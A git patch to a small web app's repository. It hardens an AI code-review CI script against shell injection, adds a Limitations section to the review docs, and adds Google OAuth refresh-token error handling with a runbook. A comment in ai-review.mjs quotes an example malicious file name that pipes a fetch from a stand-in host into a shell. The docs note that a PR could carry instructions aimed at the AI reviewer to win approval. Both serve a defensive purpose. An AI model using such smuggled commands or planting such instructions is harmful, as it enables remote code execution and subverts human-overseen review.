@@ -1,0 +1,489 @@
+diff --git a/.github/AI_REVIEW.md b/.github/AI_REVIEW.md
+index d08b607..7c48346 100644
+--- a/.github/AI_REVIEW.md
++++ b/.github/AI_REVIEW.md
+@@ -125,3 +125,39 @@ check just reflects the latest run's result automatically.
+   as advisory, tighten the severity guidance in the system prompt rather
+   than changing the gating logic — the gating logic just trusts whatever
+   severity Claude assigns.
++
++## What gets excluded from review
++
++`Public/Vendor/**`, `*.patch`, `*.wav` and `*.zip` are excluded from both the
++diff and the full-file context (`EXCLUDE_PATHSPECS` in `ai-review.mjs`).
++Vendored bundles are minified third-party code (each of the two currently in
++the repo is larger than the whole 150K diff budget), and a hand-delivered
++`.patch` file duplicates a diff that's already being reviewed — either one
++would push the code that actually changed out of the review window. Add
++paths there if another generated/vendored directory shows up.
++
++## Limitations — read before treating a green check as "safe"
++
++- **Only what's in the PR diff is reviewed.** Schema, RLS-policy and Edge
++  Function changes applied directly to the Supabase project (e.g. via the
++  Supabase MCP `apply_migration` / `deploy_edge_function`) never pass through
++  this pipeline, and there is no `Supabase/migrations/` folder in the repo to
++  review either. For anything touching auth/RLS, that's the bigger gap.
++- **The PR is model input.** A diff or comment containing instructions aimed
++  at the reviewer could try to talk it into approving. Findings are a strong
++  signal, not a proof; the "sensitive-area" findings exist precisely so a
++  human still looks at auth, payments and deletion.
++- **It fails closed.** A missing/invalid `ANTHROPIC_API_KEY`, an API outage or
++  a rate limit exits non-zero and blocks the required check, even though
++  nothing is wrong with the PR.
++- **Repo admins can bypass it.** `setup-branch-protection.sh` leaves
++  `enforce_admins` off (so a solo owner isn't locked out when the check is
++  broken), which also means the owner can merge past a red check or push
++  straight to `main`. Turn on "Include administrators" if you want the gate
++  to bind you too.
++- **Fork PRs won't run it.** `pull_request` workflows get no secrets from
++  forks, so the job fails there. That's the safe default — don't switch the
++  trigger to `pull_request_target` to "fix" it: that would run this job with
++  your secrets against untrusted fork content.
++- **Comments accumulate.** Every push re-posts inline comments; earlier ones
++  aren't resolved or de-duplicated.
+diff --git a/.github/DEPLOYMENT.md b/.github/DEPLOYMENT.md
+index 2359c2c..4113408 100644
+--- a/.github/DEPLOYMENT.md
++++ b/.github/DEPLOYMENT.md
+@@ -33,6 +33,30 @@ broken it's caught immediately" — which is the property people usually
+ actually want from "canary" in a setup this size. It's a deliberately
+ honest substitute, not the real thing.
+ 
++## Things that make the pipeline quietly do nothing
++
++- **A failing `typecheck` job skips `deploy` entirely** (`needs: typecheck`).
++  The repo can then sit ahead of the live function with no deploy ever
++  attempted — the failed-run notification is the only signal. `typecheck` uses
++  `deno-version: v2.x`, i.e. the newest 2.x, so a Deno/TypeScript upgrade can
++  break a function that compiled last month (this happened with
++  `Uint8Array` → `fetch()` body typing; see `Supabase/README.md`'s
++  2026-09-21 entry). If a merged function change isn't live, check the
++  Actions tab before assuming it deployed.
++- **The `production` approval gate waits indefinitely** for a reviewer; an
++  unapproved run is just a pending job.
++- **It deploys every function that has an `index.ts`, not only the changed
++  one.** Today that is only `upload-employee-photo` (`proximity-scan` and
++  `admin-users` are docs-only stubs deployed by hand, so their source isn't
++  version-controlled here). Adding an `index.ts` for another function means
++  the next merge touching *any* function redeploys it too — make sure the
++  committed source matches what's live first (`supabase functions download
++  <slug>`).
++- **The smoke test is an `OPTIONS` request**: it proves the function boots,
++  not that its Google/Drive credentials still work.
++- **Verify a deploy landed**: `Supabase:list_edge_functions` should show the
++  version incremented and a fresh `updated_at`.
++
+ ## One-time setup
+ 
+ ### 1. Secrets
+@@ -71,8 +95,10 @@ capable of driving branch create/merge if you want to add it later.
+ 
+ There's no deploy pipeline here for the static frontend
+ (`Public/`, `CSS/`, `JS/`) because there's no hosting target configured
+-yet — it's been tested locally so far (`npx serve Public`, per the main
+-README). Once you pick a host (GitHub Pages, Vercel, Netlify, etc.), a
++yet — it's been tested locally so far (`npx serve .` from the repo root and
++open `/Public/index.html`, per the main README §3 — *not* `npx serve Public`:
++`index.html` references `../CSS` and `../JS`, and `sw.js` lives at the repo
++root, so serving only `Public/` 404s all three). Once you pick a host (GitHub Pages, Vercel, Netlify, etc.), a
+ `deploy-frontend.yml` workflow following the same shape (typecheck/lint →
+ approval gate → deploy → smoke test) can be added — happy to build that
+ once the target's decided.
+diff --git a/.github/scripts/ai-review.mjs b/.github/scripts/ai-review.mjs
+index cf45b75..77111dc 100644
+--- a/.github/scripts/ai-review.mjs
++++ b/.github/scripts/ai-review.mjs
+@@ -9,7 +9,7 @@
+ // once it's set as a required status check (see AI_REVIEW.md — that part
+ // can't be done from a workflow file, it's a repo settings change).
+ 
+-import { execSync } from 'node:child_process';
++import { execFileSync } from 'node:child_process';
+ 
+ const {
+   ANTHROPIC_API_KEY,
+@@ -40,19 +40,38 @@ const MAX_TOTAL_CONTEXT_CHARS = 300_000; // across all included full files combi
+ //    a changed line lives in).
+ // ---------------------------------------------------------------------
+ 
+-function sh(cmd) {
+-  return execSync(cmd, { maxBuffer: 1024 * 1024 * 50 }).toString();
++// argv-based, never a shell string: changed FILE NAMES come from the PR
++// author, and a name like  x$(curl evil|sh).txt  interpolated into an
++// execSync() command line would run as shell code on a runner that holds
++// ANTHROPIC_API_KEY and a pull-requests:write GITHUB_TOKEN. execFileSync
++// passes each argument straight to git with no shell in between.
++function git(...args) {
++  return execFileSync('git', args, { maxBuffer: 1024 * 1024 * 50 }).toString();
+ }
+ 
+-const changedFiles = sh(`git diff --name-only ${BASE_SHA} ${HEAD_SHA}`)
+-  .split('\n').map((s) => s.trim()).filter(Boolean);
++// Never worth reviewing (or paying tokens for): vendored/minified third-party
++// bundles, hand-delivered .patch files, and binary media. Without this, one
++// bump of Public/Vendor/*.js or a stray .patch file eats the whole diff
++// budget below and the code that actually changed gets truncated away.
++const EXCLUDE_PATHSPECS = [
++  ':(exclude)Public/Vendor/**',
++  ':(exclude)*.patch',
++  ':(exclude)*.wav',
++  ':(exclude)*.zip',
++];
++
++// -z: NUL-separated, unquoted names — without it git C-quotes any path with
++// non-ASCII or special characters, and the later `git show <sha>:<name>`
++// then fails silently for exactly those files.
++const changedFiles = git('diff', '--name-only', '-z', BASE_SHA, HEAD_SHA, '--', '.', ...EXCLUDE_PATHSPECS)
++  .split('\0').filter(Boolean);
+ 
+ if (!changedFiles.length) {
+-  console.log('No changed files — nothing to review.');
++  console.log('No reviewable changed files — nothing to review.');
+   process.exit(0);
+ }
+ 
+-let diff = sh(`git diff ${BASE_SHA} ${HEAD_SHA}`);
++let diff = git('diff', BASE_SHA, HEAD_SHA, '--', '.', ...EXCLUDE_PATHSPECS);
+ let diffTruncated = false;
+ if (diff.length > MAX_DIFF_CHARS) {
+   diff = diff.slice(0, MAX_DIFF_CHARS);
+@@ -66,7 +85,7 @@ for (const file of changedFiles) {
+   if (budget <= 0) { contextTruncated = true; break; }
+   let content;
+   try {
+-    content = sh(`git show ${HEAD_SHA}:"${file}"`);
++    content = git('show', `${HEAD_SHA}:${file}`);
+   } catch {
+     continue; // deleted, binary, or otherwise unreadable — the diff hunk alone is fine for these
+   }
+diff --git a/.github/scripts/setup-branch-protection.sh b/.github/scripts/setup-branch-protection.sh
+index 8b6ac39..b645e11 100644
+--- a/.github/scripts/setup-branch-protection.sh
++++ b/.github/scripts/setup-branch-protection.sh
+@@ -18,7 +18,10 @@
+ 
+ set -euo pipefail
+ 
+-REPO_SLUG="$(git config --get remote.origin.url | sed -E 's#.*[:/]([^/]+/[^/]+)\.git#\1#')"
++# Handles https/ssh remotes with or without a trailing .git or slash — the
++# previous pattern required ".git" and, on a plain https://github.com/o/r
++# remote, matched nothing and passed the whole URL through as the "slug".
++REPO_SLUG="$(git config --get remote.origin.url | sed -E 's#^.*github\.com[:/]##; s#/$##; s#\.git$##')"
+ BRANCH="${1:-main}"
+ : "${GITHUB_TOKEN:?Set GITHUB_TOKEN to a personal access token with repo admin access first.}"
+ 
+diff --git a/README.md b/README.md
+index 9a8bb7a..e5c0773 100644
+--- a/README.md
++++ b/README.md
+@@ -424,6 +424,34 @@ file can drift from the live state between sessions.*
+ 
+ ### Change log (most recent first)
+ 
++**2026-09-21 — Google Drive token expiry handling, `.github` hardening, doc drift fixes**
++- **Google Drive "token expired"**: the Edge Function already renews the
++  short-lived access token silently; what expires is the long-lived
++  *refresh token*, which Google will only re-issue after an interactive
++  consent — there is no server-side way to renew it automatically. So the
++  fix is two-sided: prevent it (OAuth consent screen must be **In
++  production**, not Testing, which caps refresh tokens at 7 days) and make
++  it obvious and quick to recover from. `upload-employee-photo` now returns
++  HTTP 503 + `code: "google_reauth_required"` with an actionable message
++  (Settings → Employee photos shows it too), logs Google's real error, and
++  `Supabase/functions/upload-employee-photo/README.md` has a causes/prevention/
++  re-issue runbook. Details: `Supabase/README.md`'s matching entry.
++- **CI**: `deno check` was failing on current Deno (`Uint8Array` → `fetch`
++  body typing in `concatBytes()`), which silently skips the deploy job —
++  fixed; see `Supabase/README.md`.
++- **`.github/scripts/ai-review.mjs`**: shell-injection fix (file names from a
++  PR were interpolated into an `execSync()` command line on a runner holding
++  `ANTHROPIC_API_KEY`; now `execFileSync` with argv), `-z` so non-ASCII file
++  names aren't silently dropped from the review context, and vendored
++  bundles / `.patch` / `.wav` / `.zip` excluded so they can't consume the
++  diff budget (`Public/Vendor/*` alone can exceed it).
++  `.github/scripts/setup-branch-protection.sh` now parses `origin` URLs
++  without a trailing `.git`.
++- **Docs**: `.github/DEPLOYMENT.md` said to run the frontend with
++  `npx serve Public`, which contradicts §3 above (index.html references
++  `../CSS` and `../JS`, and `/sw.js` lives at the repo root — serve the repo
++  root); corrected. `.github/AI_REVIEW.md` gained a Limitations section.
++
+ **2026-09-19 — Offline remarks flag, Recent Activity IN/OUT, Scanner input no longer triggers Chrome's password UI**
+ - **Offline unresolved-remarks flag** — `ScanResultCard.js`'s ⚠ unresolved-remark
+   banner already worked for a live scan (which gets `remarks_log` via
+diff --git a/Supabase/README.md b/Supabase/README.md
+index f1cba81..030e803 100644
+--- a/Supabase/README.md
++++ b/Supabase/README.md
+@@ -342,6 +342,14 @@ outlasts the token isn't guaranteed unless that's addressed separately
+   client-supplied value that fails a basic size/decode sanity check) is
+   logged and returns `thumb_b64: null`, never fails the upload itself
+   (`url`/`file_id` are already secured by that point regardless).
++  When Google itself rejects the stored OAuth credentials the function
++  answers **HTTP 503** with a stable `code` (`google_reauth_required` for
++  an expired/revoked refresh token, `google_client_invalid` for a bad OAuth
++  client) instead of a bare 500 — access tokens renew silently on every
++  call, but a dead *refresh* token can only be replaced by a human
++  re-consenting once. Causes, prevention, and the 2-minute re-issue steps
++  are in `functions/upload-employee-photo/README.md` → "Refresh token stops
++  working?".
+ 
+ See `functions/proximity-scan/README.md`, `functions/admin-users/README.md`,
+ and `functions/upload-employee-photo/README.md` for the request/response
+@@ -357,6 +365,36 @@ git commits here since nothing is deployed *from* this repo yet.*
+ 
+ ### Change log (most recent first)
+ 
++**2026-09-21 — `upload-employee-photo`: Google auth failures get a stable code; typecheck fix**
++- Reported as "Google Drive token expired". Root cause class: Google's
++  `invalid_grant` on the **refresh token** (not the access token, which
++  already renews itself silently on every call). Previously surfaced as a
++  bare 500 carrying Google's raw wording; now a 503 with
++  `code: "google_reauth_required"` (or `google_client_invalid`) and an
++  actionable message, and the underlying Google error is written to the
++  function log (`Google token refresh failed (HTTP 400): invalid_grant — …`)
++  so the cause can be confirmed rather than guessed. No client change was
++  needed: `EmployeesModel.js`'s upload/delete/quota paths already display
++  `body.error` verbatim.
++- `concatBytes()`'s explicit `: Uint8Array` return annotation made
++  `deno check` fail on Deno/TypeScript 5.7+ (`Uint8Array<ArrayBufferLike>`
++  is no longer a valid `fetch()` body). CI's typecheck job runs
++  `deno-version: v2.x` (newest 2.x), so this fails the `typecheck` job and
++  the dependent `deploy` job never runs — a plausible reason the repo can sit
++  ahead of the live function without any visible error. Return type is now
++  inferred; no runtime change.
++- **Drift as of this entry:** live `upload-employee-photo` was v36
++  (2026-09-19 02:37 UTC) and still had the original server-side `sz=w96`
++  thumbnail fetch, with no handling of the client-supplied
++  `thumb_base64` — i.e. the client sends a ~480px thumbnail that the live
++  function ignores. This repo's `index.ts` has the newer behavior. Run
++  `Supabase:list_edge_functions` / `get_edge_function` before assuming either
++  side is current.
++- `README.md` for the function rewritten: request/response contract now
++  includes `quota`, the thumbnail fields, the `thumbnail?id=…` URL format
++  (it still documented the retired `uc?export=view` URL), and the error-code
++  table.
++
+ **2026-09-19 — Dropped a redundant, unused RPC (self-correction)**
+ - `clear_employee_scan_log(p_employee_id)` — a whole-log-nuke function
+   added earlier this same session as a first attempt at "let an admin
+diff --git a/Supabase/functions/upload-employee-photo/README.md b/Supabase/functions/upload-employee-photo/README.md
+index 6531a2b..b93bb7a 100644
+--- a/Supabase/functions/upload-employee-photo/README.md
++++ b/Supabase/functions/upload-employee-photo/README.md
+@@ -11,24 +11,39 @@ Authorization: Bearer <user's access_token>
+ Content-Type: application/json
+ 
+ // upload:
+-{ "action": "upload", "image_base64": "<webp bytes, base64>", "filename": "EMP-1044", "old_file_id": "1AbC..." }
++{ "action": "upload", "image_base64": "<image bytes, base64>", "mime_type": "image/webp",
++  "filename": "EMP-1044", "old_file_id": "1AbC...",
++  "thumb_base64": "<~480px .webp thumbnail, base64>", "thumb_mime_type": "image/webp" }
+ // delete:
+ { "action": "delete", "old_file_id": "1AbC..." }
++// quota (read-only, Settings' "Employee photos" panel):
++{ "action": "quota" }
+ ```
+ 
+-Called from `JS/Models/EmployeesModel.js#uploadPhoto` /
+-`#deletePhoto`. `EmployeeModal.js` converts whatever image the user picks
+-to `.webp` client-side (`JS/Utils/image.js`) before it ever reaches this
++Called from `JS/Models/EmployeesModel.js#uploadPhoto` / `#deletePhoto` /
++`#getPhotoStorageQuota`. `EmployeeModal.js` converts whatever image the user
++picks to `.webp` client-side (`JS/Utils/image.js`) before it ever reaches this
+ function — the function itself just stores whatever bytes it's given.
++`thumb_base64` is optional: when it's missing or malformed the function falls
++back to a (lower-res, 2.5s-bounded) server-side Drive thumbnail fetch.
+ 
+ **Response**
+-- upload: `{ "url": "https://drive.google.com/uc?export=view&id=...", "file_id": "..." }`
++- upload: `{ "url": "https://drive.google.com/thumbnail?id=...&sz=w512", "file_id": "...", "thumb_b64": "..."|null }`
+ - delete: `{ "ok": true }`
+-- error: `{ "error": "message" }`
++- quota: `{ "usage": n, "limit": n|null, "usageInDrive": n }` (bytes; `limit` null = uncapped account)
++- error: `{ "error": "message" }`, plus a stable `"code"` when the cause is the
++  stored Google credentials rather than the request:
+ 
+-Access is gated by `is_admin_or_manager()`, re-checked server-side against
+-the caller's own JWT — a signed-in viewer gets a 403 even with a valid
+-session.
++| HTTP | `code` | Meaning | Fix |
++|---|---|---|---|
++| 503 | `google_reauth_required` | Google answered `invalid_grant` — the stored **refresh token** is expired/revoked | Re-issue the token (see "Refresh token stops working?" below) |
++| 503 | `google_client_invalid` | Google answered `invalid_client` / `unauthorized_client` — OAuth client deleted, secret rotated or mistyped | Check `GOOGLE_OAUTH_CLIENT_ID` / `_SECRET` |
++| 4xx/500 | — | Anything else (bad request, permission, Drive API error) | — |
++
++Access is gated per action, re-checked server-side against the caller's own
++JWT: `upload` / `delete` need `is_admin_or_manager()`; `quota` needs
++`can_view_settings()`. A signed-in viewer without Settings access gets a 403
++even with a valid session.
+ 
+ ## Why OAuth instead of a service account
+ 
+@@ -119,12 +134,53 @@ would mean either creating the target folder through this same OAuth flow
+ rather than by hand, or adding a Picker step — more setup for not much
+ practical benefit in a single-purpose internal tool.
+ 
+-**Refresh token stops working?** The most common cause is the consent
+-screen having been left in "Testing" (step 2) — reissue a token from
+-Playground after switching to "In production". A revoked token (e.g. you
+-removed the app's access under
+-[myaccount.google.com/permissions](https://myaccount.google.com/permissions))
+-shows up as an `invalid_grant` error and needs the same re-issue.
++### Refresh token stops working?
++
++**What renews itself, and what can't.** The function already renews the
++short-lived *access token* silently — a refresh-token → access-token exchange
++on every cold call, cached in memory for ~1h. That is not what expires. What
++dies is the long-lived *refresh token* itself, and **no code can mint a
++replacement silently**: Google only issues a refresh token after an
++interactive consent by a human in a browser. So the goal isn't "auto-renew the
++refresh token" (impossible by design) — it's *stop it from dying*, and *find
++out fast when it does*.
++
++Symptom: uploads fail with "Google Drive access has expired or was revoked"
++(HTTP 503, `code: "google_reauth_required"`), Settings → Employee photos shows
++the same message, and the function log line reads
++`Google token refresh failed (HTTP 400): invalid_grant — Token has been expired or revoked.`
++Confirm in Supabase → Edge Functions → `upload-employee-photo` → Logs.
++
++**Why refresh tokens die** (most to least likely for this setup):
++
++| Cause | Prevention |
++|---|---|
++| OAuth consent screen left on **"Testing"** — refresh tokens expire after **7 days** | Set Publishing status to **"In production"** (step 2). Then re-issue the token — one issued *before* the switch keeps its 7-day limit. |
++| Token **unused for 6 months** | Any real use resets the clock; a rarely-used install should hit Settings → Employee photos occasionally (it calls `quota`). |
++| **Access revoked** at [myaccount.google.com/permissions](https://myaccount.google.com/permissions), or the Google account was deleted/suspended | Don't remove the app there. |
++| **More than 100 refresh tokens** issued for one account + one OAuth client — Google silently invalidates the *oldest* | Each Playground run mints a new one. Re-issue sparingly, and don't share this client ID with other apps. |
++| OAuth client **deleted**, or its secret rotated | Shows as `google_client_invalid`; update the secrets. |
++| Google Workspace policy (session length / API access controls) | Workspace admins only — not applicable to plain `@gmail.com`. |
++
++**Re-issue (about 2 minutes):** repeat step 4 (Playground, own credentials,
++Drive scope, sign in as the folder-owning account), then:
++```
++supabase secrets set GOOGLE_OAUTH_REFRESH_TOKEN="<new refresh token>"
++```
++No redeploy needed — secrets are read per invocation and the in-memory access
++token cache is keyed to the refresh token, so it misses and re-fetches.
++
++**Ways to remove this failure mode entirely** (in increasing effort):
++1. *"In production"* consent screen (above) — fixes the 7-day case, the usual culprit.
++2. Use a **Google Workspace** account with the OAuth app set to **Internal**
++   — internal apps aren't subject to the Testing-mode expiry or the unverified
++   app screen — or a service account + Shared Drive. Both need paid Workspace.
++3. **Move employee photos to a Supabase Storage bucket.** No Google
++   credential to expire at all; access control is plain RLS (the repo already
++   does this for `scan-sounds`), and the Drive-thumbnail hot-linking this
++   design relies on — which Google doesn't guarantee — goes away. Costs a
++   one-off migration of existing `photo_url`/`photo_file_id` values and
++   retiring this function.
+ 
+ **Sharing model:** uploaded photos are set to "anyone with the link can
+ view" so `photo_url` renders directly as an `<img src>` in the app. If
+diff --git a/Supabase/functions/upload-employee-photo/index.ts b/Supabase/functions/upload-employee-photo/index.ts
+index 21f0c5c..3bad009 100644
+--- a/Supabase/functions/upload-employee-photo/index.ts
++++ b/Supabase/functions/upload-employee-photo/index.ts
+@@ -22,6 +22,18 @@
+ //   misread as "0 bytes available". Read by Settings' "Employee photos"
+ //   capacity panel (JS/Features/Settings/SettingsPage.js).
+ //
++// Errors: { error: string, code?: string }. `code` is only set for failures the
++// caller can't fix by retrying:
++//   503 google_reauth_required — Google rejected the stored refresh token
++//        (invalid_grant: revoked, expired, or the consent screen is in
++//        "Testing"). Access tokens renew silently on every call; a dead
++//        REFRESH token can only be replaced by a human re-consenting once —
++//        see README.md → "Refresh token stops working?".
++//   503 google_client_invalid — Google rejected the OAuth client itself
++//        (invalid_client / unauthorized_client: client deleted, secret rotated
++//        or mistyped). Needs the same admin fix path as above.
++//   Everything else stays a plain 4xx/500 with just `error`.
++//
+ // Auth is per-action, not a single blanket check: "quota" is read-only
+ // (just tells the caller how much room is left) so it's allowed for
+ // anyone with Settings access at all — including Viewers — via
+@@ -266,6 +278,12 @@ Deno.serve(async (req: Request) => {
+ 
+     return json({ error: `Unknown action "${action}"` }, 400, cors);
+   } catch (err) {
++    // 503 (upstream credential problem), not 500 (our bug): nothing is wrong
++    // with this function or the caller's request, and a stable `code` lets
++    // the UI show "re-authorize Google Drive" instead of a raw Google string.
++    if (err instanceof GoogleAuthError) {
++      return json({ error: err.message, code: err.code }, 503, cors);
++    }
+     return json({ error: (err as Error).message }, 500, cors);
+   }
+ });
+@@ -274,6 +292,17 @@ function json(body: unknown, status: number, cors: Record<string, string>) {
+   return new Response(JSON.stringify(body), { status, headers: { ...cors, "Content-Type": "application/json" } });
+ }
+ 
++// A failure of the stored Google credentials themselves (as opposed to a
++// transient network/API error), carrying a stable machine-readable `code`.
++class GoogleAuthError extends Error {
++  code: "google_reauth_required" | "google_client_invalid";
++  constructor(code: "google_reauth_required" | "google_client_invalid", message: string) {
++    super(message);
++    this.name = "GoogleAuthError";
++    this.code = code;
++  }
++}
++
+ // ---- Google OAuth (refresh token -> short-lived access token) ----
+ // Much simpler than the service-account JWT-signing flow it replaces: no
+ // RS256/Web Crypto involved, just a single token-refresh POST.
+@@ -317,12 +346,32 @@ async function getGoogleAccessToken(clientId: string, clientSecret: string, refr
+       grant_type: "refresh_token",
+     }),
+   });
+-  const data = await res.json();
++  // .catch: a non-JSON body (proxy/HTML error page) must not mask the real
++  // HTTP status behind a JSON parse exception.
++  const data = await res.json().catch(() => ({}));
+   if (!res.ok) {
++    const googleError = String(data.error || "");
++    // Logged with Google's own wording: the response to the browser is
++    // deliberately friendlier, and function logs are where an admin looks
++    // to confirm which failure this really was. Contains no secrets.
++    console.error(`Google token refresh failed (HTTP ${res.status}): ${googleError || "no error code"} — ${data.error_description || "no description"}`);
+     // A revoked/expired refresh token (e.g. the OAuth consent screen was
+     // left in "Testing" mode, which caps tokens at 7 days — see README)
+-    // shows up here as invalid_grant.
+-    throw new Error(data.error_description || data.error || "Google authentication failed — the refresh token may be invalid or revoked.");
++    // shows up here as invalid_grant. There is no server-side way to mint a
++    // replacement: Google requires an interactive consent for that.
++    if (googleError === "invalid_grant") {
++      throw new GoogleAuthError(
++        "google_reauth_required",
++        "Google Drive access has expired or was revoked. An admin needs to re-authorize the connection (see Supabase/functions/upload-employee-photo/README.md → \"Refresh token stops working?\").",
++      );
++    }
++    if (googleError === "invalid_client" || googleError === "unauthorized_client") {
++      throw new GoogleAuthError(
++        "google_client_invalid",
++        "Google rejected this app's OAuth client credentials. An admin needs to check GOOGLE_OAUTH_CLIENT_ID / GOOGLE_OAUTH_CLIENT_SECRET (see Supabase/functions/upload-employee-photo/README.md).",
++      );
++    }
++    throw new Error(data.error_description || googleError || `Google authentication failed (HTTP ${res.status}).`);
+   }
+   // expires_in is Google's own stated lifetime in seconds (normally 3600).
+   // Falling back to a conservative 1800s if it's ever absent from the
+@@ -423,7 +472,14 @@ function bytesToBase64(bytes: Uint8Array): string {
+   return btoa(binary);
+ }
+ 
+-function concatBytes(parts: Uint8Array[]): Uint8Array {
++// Return type deliberately inferred, not annotated as `Uint8Array`: on
++// Deno/TypeScript 5.7+ a bare `Uint8Array` means Uint8Array<ArrayBufferLike>,
++// which fetch()'s BodyInit no longer accepts (it wants an ArrayBuffer-backed
++// one) — the inferred Uint8Array<ArrayBuffer> from `new Uint8Array(total)`
++// below is accepted, and on older toolchains still just infers plain
++// Uint8Array. This exact annotation made `deno check` fail in CI
++// (.github/workflows/deploy-supabase.yml), which skips the deploy job.
++function concatBytes(parts: Uint8Array[]) {
+   const total = parts.reduce((n, p) => n + p.length, 0);
+   const out = new Uint8Array(total);
+   let offset = 0;
